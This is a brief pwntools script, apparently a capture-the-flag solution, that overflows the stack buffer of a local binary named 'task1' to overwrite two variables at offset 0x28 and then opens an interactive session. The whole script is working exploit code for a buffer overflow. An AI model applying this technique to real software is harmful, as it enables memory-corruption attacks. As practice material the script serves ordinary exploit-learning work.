from pwn import *
p = process('./task1')
v7 = 0x7FFFFFFFFFFFFFFF
v8 = 0x3FB999999999999A
offset = 0x28
payload = (p64(v7) + p64(v8)).rjust(offset, '\0')
p.sendline(payload)
p.interactive()